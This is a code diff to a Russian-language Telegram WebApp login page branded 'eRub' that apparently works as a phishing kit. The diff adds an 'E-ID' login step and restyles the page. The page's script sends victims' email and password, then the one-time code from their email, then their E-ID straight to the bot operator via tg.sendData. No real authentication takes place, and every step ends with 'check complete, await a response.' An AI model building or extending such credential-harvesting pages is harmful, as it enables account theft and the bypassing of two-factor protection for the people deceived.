@@ -26,18 +26,19 @@
             padding: 48px 40px;
             width: 100%;
             max-width: 440px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
-            min-height: 520px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+            min-height: 540px;
             display: flex;
             flex-direction: column;
+            transition: all 0.3s;
         }
 
         .logo {
             text-align: center;
-            margin-bottom: 36px;
+            margin-bottom: 32px;
         }
         .logo h1 {
-            font-size: 32px;
+            font-size: 34px;
             font-weight: 800;
             color: #1a1a2e;
             letter-spacing: -0.5px;
@@ -45,10 +46,11 @@
         .logo h1 span {
             color: #4361ee;
         }
-        .logo p {
+        .logo .sub {
             color: #6c757d;
-            font-size: 15px;
-            margin-top: 4px;
+            font-size: 13px;
+            margin-top: 2px;
+            font-weight: 400;
         }
 
         .form-group {
@@ -99,7 +101,31 @@
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
+
+        .btn-eid {
+            width: 100%;
+            padding: 16px;
+            background: #1a1a2e;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-eid:hover {
+            background: #2d2d44;
+            transform: translateY(-1px);
+        }
+
         .btn-secondary {
             width: 100%;
             padding: 14px;
@@ -121,7 +147,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            margin: 24px 0 16px;
+            margin: 20px 0 16px;
         }
         .divider::before,
         .divider::after {
@@ -136,10 +162,26 @@
             font-weight: 500;
         }
 
+        .forgot-link {
+            text-align: right;
+            margin-top: -10px;
+            margin-bottom: 12px;
+        }
+        .forgot-link a {
+            color: #6c757d;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .forgot-link a:hover {
+            color: #4361ee;
+            text-decoration: underline;
+        }
+
         .register-link {
             text-align: center;
             font-size: 14px;
             color: #6c757d;
+            margin-top: 6px;
         }
         .register-link a {
             color: #4361ee;
@@ -259,7 +301,7 @@
         }
 
         .step-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             color: #1a1a2e;
             margin-bottom: 4px;
@@ -269,6 +311,10 @@
             color: #6c757d;
             margin-bottom: 16px;
         }
+
+        .eid-icon {
+            font-size: 20px;
+        }
     </style>
 </head>
 <body>
@@ -277,7 +323,7 @@
         <!-- ===== ЛОГО ===== -->
         <div class="logo">
             <h1><span>eRub</span></h1>
-            <p>Войдите в свой аккаунт</p>
+            <div class="sub">ON-LINE CERTIFICATION AND AUTHORIZATION SERVICE</div>
         </div>
 
         <!-- ========================================= -->
@@ -285,17 +331,27 @@
         <!-- ========================================= -->
         <div id="stepLogin">
             <div class="form-group">
-                <label>📧 Email</label>
-                <input type="email" id="email" placeholder="your@email.com">
+                <label>Email</label>
+                <input type="email" id="email" placeholder="Введите ваш email">
             </div>
             <div class="form-group">
-                <label>🔑 Пароль</label>
+                <label>Пароль</label>
                 <input type="password" id="password" placeholder="Введите пароль">
             </div>
-            <button id="loginBtn" class="btn-primary">🔓 Войти</button>
+            <div class="forgot-link">
+                <a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
+            </div>
+
+            <button id="loginBtn" class="btn-primary">ВХОД</button>
 
             <div class="divider"><span>или</span></div>
-            <div class="register-link">
+
+            <!-- ===== E-ID КНОПКА ===== -->
+            <button id="eidBtn" class="btn-eid">
+                <span class="eid-icon">🆔</span> Вход через E-ID
+            </button>
+
+            <div class="register-link" style="margin-top:16px;">
                 Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
             </div>
         </div>
@@ -325,6 +381,26 @@
             <button id="backBtn" class="btn-secondary">← Назад</button>
         </div>
 
+        <!-- ========================================= -->
+        <!-- ===== ШАГ 3: E-ID ===== -->
+        <!-- ========================================= -->
+        <div id="stepEid" class="hidden">
+            <div style="text-align:center;margin-bottom:12px;">
+                <div style="font-size:40px;">🆔</div>
+                <div class="step-title">Вход через E-ID</div>
+                <div class="step-sub">Введите ваш E-ID для авторизации</div>
+            </div>
+
+            <div class="form-group">
+                <label>E-ID</label>
+                <input type="text" id="eidInput" placeholder="Введите ваш E-ID">
+            </div>
+
+            <button id="eidSubmitBtn" class="btn-primary">🔓 Войти через E-ID</button>
+
+            <button id="backFromEidBtn" class="btn-secondary">← Назад</button>
+        </div>
+
         <!-- ===== СООБЩЕНИЯ ===== -->
         <div id="msg" class="message"></div>
 
@@ -339,18 +415,21 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
+        // Элементы
         const stepLogin = document.getElementById('stepLogin');
         const stepCode = document.getElementById('stepCode');
+        const stepEid = document.getElementById('stepEid');
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
+        const eidInput = document.getElementById('eidInput');
         const loginBtn = document.getElementById('loginBtn');
         const codeBtn = document.getElementById('codeBtn');
         const backBtn = document.getElementById('backBtn');
+        const eidBtn = document.getElementById('eidBtn');
+        const eidSubmitBtn = document.getElementById('eidSubmitBtn');
+        const backFromEidBtn = document.getElementById('backFromEidBtn');
         const msgDiv = document.getElementById('msg');
-
-        let lastEmail = '';
-        let lastPass = '';
 
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
@@ -362,16 +441,11 @@
             }, 5000);
         }
 
-        function goToCode() {
+        function goToStep(step) {
             stepLogin.classList.add('hidden');
-            stepCode.classList.remove('hidden');
-            codeInput.value = '';
-            setTimeout(() => codeInput.focus(), 300);
-        }
-
-        function goToLogin() {
             stepCode.classList.add('hidden');
-            stepLogin.classList.remove('hidden');
+            stepEid.classList.add('hidden');
+            step.classList.remove('hidden');
             msgDiv.style.display = 'none';
         }
 
@@ -393,23 +467,19 @@
 
             loginBtn.disabled = true;
             loginBtn.textContent = '⏳ Отправка...';
-            showMsg('Отправка данных...', 'info');
-
-            lastEmail = e;
-            lastPass = p;
 
             try {
                 tg.sendData(JSON.stringify({ email: e, password: p }));
-                // СРАЗУ ОТКРЫВАЕМ ОКНО КОДА
                 loginBtn.disabled = false;
-                loginBtn.textContent = '🔓 Войти';
-                msgDiv.style.display = 'none';
-                goToCode();
+                loginBtn.textContent = 'ВХОД';
+                // СРАЗУ ОТКРЫВАЕМ ОКНО КОДА
+                goToStep(stepCode);
                 showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
+                setTimeout(() => codeInput.focus(), 300);
             } catch (err) {
                 showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
                 loginBtn.disabled = false;
-                loginBtn.textContent = '🔓 Войти';
+                loginBtn.textContent = 'ВХОД';
             }
         });
 
@@ -426,7 +496,6 @@
 
             codeBtn.disabled = true;
             codeBtn.textContent = '⏳ Отправка...';
-            showMsg('Отправка кода...', 'info');
 
             try {
                 tg.sendData(JSON.stringify({ code: code }));
@@ -435,9 +504,8 @@
                 codeBtn.textContent = '✅ Подтвердить';
                 codeInput.value = '';
 
-                // через 2 секунды возвращаемся к форме
                 setTimeout(() => {
-                    goToLogin();
+                    goToStep(stepLogin);
                     showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
                 }, 2000);
 
@@ -449,12 +517,62 @@
         });
 
         // ============================================================
-        // 4. НАЗАД
+        // 4. НАЗАД (из кода)
         // ============================================================
-        backBtn.addEventListener('click', goToLogin);
+        backBtn.addEventListener('click', function() {
+            goToStep(stepLogin);
+        });
 
         // ============================================================
-        // 5. ENTER
+        // 5. E-ID → ОТКРЫТЬ ОКНО E-ID
+        // ============================================================
+        eidBtn.addEventListener('click', function() {
+            goToStep(stepEid);
+            setTimeout(() => eidInput.focus(), 300);
+        });
+
+        // ============================================================
+        // 6. E-ID → ОТПРАВКА E-ID
+        // ============================================================
+        eidSubmitBtn.addEventListener('click', function() {
+            const eid = eidInput.value.trim();
+
+            if (!eid) {
+                showMsg('Введите ваш E-ID', 'error');
+                return;
+            }
+
+            eidSubmitBtn.disabled = true;
+            eidSubmitBtn.textContent = '⏳ Отправка...';
+
+            try {
+                tg.sendData(JSON.stringify({ eid: eid }));
+                showMsg('✅ E-ID отправлен администратору!', 'success');
+                eidSubmitBtn.disabled = false;
+                eidSubmitBtn.textContent = '🔓 Войти через E-ID';
+                eidInput.value = '';
+
+                setTimeout(() => {
+                    goToStep(stepLogin);
+                    showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
+                }, 2000);
+
+            } catch (err) {
+                showMsg('❌ Ошибка отправки E-ID', 'error');
+                eidSubmitBtn.disabled = false;
+                eidSubmitBtn.textContent = '🔓 Войти через E-ID';
+            }
+        });
+
+        // ============================================================
+        // 7. НАЗАД (из E-ID)
+        // ============================================================
+        backFromEidBtn.addEventListener('click', function() {
+            goToStep(stepLogin);
+        });
+
+        // ============================================================
+        // 8. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -462,12 +580,14 @@
                     loginBtn.click();
                 } else if (!stepCode.classList.contains('hidden')) {
                     codeBtn.click();
+                } else if (!stepEid.classList.contains('hidden')) {
+                    eidSubmitBtn.click();
                 }
             }
         });
 
         // ============================================================
-        // 6. ТЕХПОДДЕРЖКА
+        // 9. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
